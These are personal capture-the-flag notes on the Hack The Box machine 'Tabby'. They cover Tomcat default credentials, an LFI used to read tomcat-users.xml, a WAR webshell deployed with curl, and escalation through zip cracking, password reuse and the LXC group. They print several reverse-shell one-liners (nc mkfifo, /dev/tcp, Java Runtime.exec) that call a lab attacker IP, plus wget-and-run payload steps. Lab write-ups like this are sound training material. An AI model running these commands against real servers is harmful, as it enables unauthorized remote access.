# <span style="color:#FF5050">Machine #23 Tabby</span>  


## <span style="color:#FF5050">Checklist 🤓   

- [x] LFI
- [ ] ~~Maybe I can access data through this path somehow `/var/lib/tomcat9/webapps/ROOT/index.html`~~
- [ ] Scower the RUNNING.txt file for something.
- [ ] Maybe I can access data through this path somehow `/var/lib/tomcat9/webapps/ROOT/index.html`
- [x] Try default credentials for `/html/manager` and `/html/host-manager`.
- [ ] Bruteforce the `/html/manager` login credentials.

<br/><br/>


## <span style="color:#FF5050">What Do We Have? 🤔🤔 

* A `http://10.10.10.194:8080/manager/html` manager page that prompts me for a username and a password (Tried the defaults and they didn't work).
* Default credentials that could be the ones  
  ```
  admin:admin
  tomcat:tomcat
  admin:<NOTHING>
  admin:s3cr3t
  tomcat:s3cr3t
  admin:tomcat
  ```
<br/><br/> 


## <span style="color:#FF5050">Random Notes👀
  
* PHP is being used in the backend.  
* So LFI gives me access to files, let's call it, outside of the sandboxed environment but it does not allow me to read files I don't have privilege to read. So what am I supposed to do with it?
* I will use the manual exploit to try and understand it as much as I can (The upload war thing).
* It seems that I can't upload a .war file unless I have the right privileges which can be acquired if I have the roles admin, manager or manager-script and according to the `tomcat-users.xml` file I have the `manager-script` role.  
* The path was right infront of me in the HackTricks page in the RCE section. What lesson did I learn? Read articles properly and don't skip stuff.
* I will be creating a .war webshell and then I will upload it with this line of code  
  ```
  curl --upload-file webshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/webshell"
  ```  
* After creating the war file and uploading it using the previous curl code I can just visit the path `/webshell` with `?cmd=[COMMAND]` which will lead to executing the webshell.  
* Imma try and upload a reverse shell from the beginning and not a webshell  
  ```java
  Runtime r = Runtime.getRuntime();
  Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.8/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'");
  p.waitFor();
  ```

  ```
  rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
  ```
  ```
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
<br/><br/>  


## <span style="color:#FF5050">How Did I Own This Shit 😎🥳  

1. At first I looked through the web service and the tomcat service more than enough time which was not really necessary because I just had to find the right path to get to `tomcat-users.xml` I just was using the wrong paths. But the problem is how can I tell when I have an LFI and a file didn't show that I've been using the wrong path and not that I don't have permission to use it because, technically, the LFI is on the web service which means the `www-data` user and the file I'm trying to read is on the tomcat service which has another user `tomcat`? This thing has been nagging me all the time. How can I tell???  
2. Any how after you open the `tomcat-users.xml` file there's not much left to own the machine just that I get a password we can then authenticate as `host-manager` and then we can use the infamous .war exploit.
3. I used `msfvenom`'s java reverse shell (The only one that worked).
4. Then I got access as tomcat on the system.
5. Found out that the `/files` directory in the web service is owned by `ash` which was a bit weird and was kind of a hint that told me that maybe this directory will give me ash and it certainly did. There was a zipped file inside of it, I transferred this file to my box and tried to crack it using `fcrackzip` at first I tried the bruteforce mode but it didn't work and it didn't make any sense either os I tried dictionary mode with rockyou and it worked I cracked the password of the zipped file because it was password protected.
6. Anyway the contents of the zipped backup file weren't as important as the password because poor ash used the same password for their user on the OS which gave me access to him.
7. He was in group LXC so it wasn't that hard to get root afterwards. The priv esc of this type is all over the internet but I wanted to understand it fully why is it that when I create a container with alpine with this group that I can access the root? I still don't get that I want to research this more.

<br/><br/>

## <span style="color:#FF5050">Writeups ✍🏽📓   

### The Official HTB Writeup  

* When the reverse shell didn't work this is what they did which is actually a good idea
    <blockquote>
    Getting a reverse shell using the above command didn't work. Let's create a reverse shell, start an
    HTTP server locally and download it to the remote machine
    </blockquote>

    * Like this code --> `echo "0<&196;exec 196<>/dev/tcp/10.10.14.3/5555; sh <&196 >&196 2>&196" > shell
php -S 0.0.0.0:8000`.    

  * Then from the webshell I enter the following   
    ```
    wget http://10.10.14.3:8000/shell-x64.elf -O /tmp/shell
    chmod +x /tmp/shell
    bash /tmp/shell
    ```

<br/><br/> 
